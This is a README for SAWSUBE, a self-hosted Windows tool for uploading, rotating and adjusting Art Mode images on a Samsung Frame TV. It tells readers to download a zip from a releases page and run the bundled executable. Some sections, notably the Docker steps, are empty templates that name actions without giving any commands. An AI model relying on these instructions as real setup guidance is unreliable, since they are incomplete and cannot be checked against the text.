# 🖼️ SAWSUBE - Manage Samsung Frame TV Art Easily

[![Download SAWSUBE](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ismail8690/SAWSUBE/releases)

SAWSUBE lets you control your Samsung Frame TV art without subscriptions or cloud accounts. You host this application on your local computer. It handles image uploads, sets rotation schedules, and adjusts Art Mode settings. You keep full control over your media files.

## 🛠️ System Requirements

Ensure your computer meets these needs:

- Windows 10 or Windows 11.
- A stable network connection.
- Your Samsung Frame TV must be on the same network as your computer.
- Basic knowledge of how to unzip a file.

## ⬇️ How to Download and Install

Follow these steps to set up the application on your computer.

1. Visit the [official releases page](https://github.com/ismail8690/SAWSUBE/releases) to download the latest version.
2. Select the file ending in `.zip` for Windows.
3. Save the file to your computer.
4. Right-click the folder and select Extract All.
5. Choose a folder where you want to keep the application.

## ⚙️ Running the Application

Once you extract the files, perform these actions to start the app:

1. Open the extracted folder.
2. Find the file labeled `SAWSUBE.exe`.
3. Double-click the file to launch the server.
4. A small window will appear. Do not close this window while you use the application.
5. Open your web browser.
6. Type `http://localhost:8000` into the address bar and press Enter.

## 🎨 Managing Your Art

The web interface allows you to organize your images. Use the following features to manage your display:

- **Upload:** Click the Upload button to add images from your folders.
- **Rotate:** Set a timer to change artwork every few hours.
- **Settings:** Adjust brightness, color tone, and sleep timers directly from the dashboard.
- **Sources:** Browse integrated free art sources to find new images for your frame.

## 🔌 Connecting to Your TV

The application finds your Samsung Frame TV automatically. 

1. Ensure your TV is turned on.
2. Navigate to the Connection tab in the SAWSUBE browser interface.
3. If the app lists your TV, click Connect.
4. Your TV might show a prompt asking for permission. Select Allow using your Samsung remote.

## ❓ Frequently Asked Questions

**Do I need a Samsung account?**
No. This software communicates directly with the hardware on your network.

**Is my data private?**
Yes. Your images stay on your computer. We do not track your usage or collect your files.

**Can I run this on a Raspberry Pi?**
Yes. Advanced users can host this on a Raspberry Pi or a home server. Use the same logic for file management as you do on Windows.

**What happens if I close the application?**
Your TV settings remain as they were, but you cannot change the art through the browser until you start the application again.

## 📝 Troubleshooting

If the application fails to connect, verify these points:

- Ensure your computer and your TV use the same Wi-Fi network.
- Restart your TV and your computer.
- Check if your firewall blocks the application. You might need to allow the connection when Windows displays a security alert.
- Clear your browser cache if the page fails to load.

## 📋 Features

- **Local Control:** No cloud dependency removes privacy concerns.
- **Flexible Scheduling:** Define specific times for art to change.
- **Fast Access:** React-based interface ensures quick navigation.
- **Media Support:** Handles high-resolution images and supports various file formats.
- **No Subscription:** You own the software and pay zero fees.

## 📦 Using Docker

If you prefer using containers to manage software, you can run SAWSUBE with Docker. This method assumes you have Docker Desktop installed on your Windows machine.

1. Open your terminal or command prompt.
2. Pull the image from the repository.
3. Run the command to start the container in the background.
4. Access the web interface at the same address as before.

This approach provides a clean way to manage the application without installing extra dependencies.

## 💡 Quick Tips

- Name your images clearly to find them in the library faster.
- Group images into folders to create different collection themes.
- Test small batches of images first to ensure they display correctly on the Frame TV screen.
- Keep the application folder in a location you can find easily, like your Documents folder.